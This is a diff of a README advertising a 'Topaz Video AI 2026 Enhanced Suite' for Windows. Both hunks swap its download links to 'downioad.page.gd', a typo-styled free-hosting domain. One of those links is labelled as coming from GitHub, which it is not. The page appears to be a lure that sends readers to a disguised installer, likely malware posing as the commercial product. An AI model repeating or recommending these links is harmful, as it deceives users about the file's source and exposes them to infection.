@@ -2,7 +2,7 @@
 
 Topaz Video AI 2026 Enhanced Suite is a comprehensive software package designed for professional video editing and enhancement. Leveraging advanced artificial intelligence, this tool provides powerful features to upscale, stabilize, and refine video content with ease. Ideal for Windows users looking to achieve cinema-quality results in their projects.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -54,7 +54,7 @@ A3: Yes, updates are provided periodically to include new AI models, performance
 
 For the latest version and more information, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
